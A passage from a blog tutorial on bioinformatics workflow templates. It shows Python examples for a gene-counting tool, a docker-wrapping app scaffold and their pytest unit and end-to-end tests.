<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pattern-3-custom-analysis">Pattern 3: Custom Analysis<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#pattern-3-custom-analysis" class="hash-link" aria-label="Direct link to Pattern 3: Custom Analysis" title="Direct link to Pattern 3: Custom Analysis" translate="no">​</a></h3>
<p>Write your own analysis tools:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/gene_counter/main.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">count_genes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> annotation_gtf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Count reads per gene from BAM file."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Load annotation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    gtf </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">annotation_gtf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sep</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"\t"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> comment</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"#"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count using samtools + Python</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> pysam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pysam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">AlignmentFile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    counts </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> read </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        gene </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> read</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">get_tag</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"XG"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> read</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">has_tag</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"XG"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"unknown"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        counts</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">gene</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> counts</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">gene</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Save results</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    df </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">DataFrame</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">list</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">counts</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">items</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> columns</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">"gene"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"count"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    df</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">to_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> index</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">False</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> df</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/gene_counter/tests/test_e2e.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_gene_counting_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> annotation_gtf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> tmp_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test gene counting."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output_csv </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"counts.csv"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    count_genes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> annotation_gtf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    results </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_csv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"count"</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">columns</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-5-adding-new-apps-and-workflows">Part 5: Adding New Apps and Workflows<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-5-adding-new-apps-and-workflows" class="hash-link" aria-label="Direct link to Part 5: Adding New Apps and Workflows" title="Direct link to Part 5: Adding New Apps and Workflows" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="template-for-new-python-app">Template for New Python App<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#template-for-new-python-app" class="hash-link" aria-label="Direct link to Template for New Python App" title="Direct link to Template for New Python App" translate="no">​</a></h3>
<p><strong>Create the structure:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> apps/myapp/tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> apps/myapp/__init__.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> apps/myapp/main.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> apps/myapp/tests/test_unit.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> apps/myapp/tests/test_e2e.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> apps/myapp/Makefile</span><br></span></code></pre></div></div>
<p><strong>apps/myapp/main.py</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">validate_input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Validate input data format."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">raise</span><span class="token plain"> FileNotFoundError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Input file not found: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">input_file</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Run my bioinformatics tool."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mkdir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">parents</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> exist_ok</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"run"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--rm"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-v"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">Path</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">Path</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"myregistry/myapp:latest"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"myapp"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--output"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> check</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>apps/myapp/tests/test_unit.py</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> apps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> validate_input</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> pytest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_validate_input_exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test validation of existing file."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create temp file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">with</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">open</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/tmp/test_input.txt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"w"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        f</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">write</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"test data"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Should not raise</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    validate_input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/tmp/test_input.txt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_validate_input_missing</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test validation of missing file."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">with</span><span class="token plain"> pytest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">raises</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">FileNotFoundError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        validate_input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/nonexistent/file.txt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>apps/myapp/tests/test_e2e.py</strong></p>
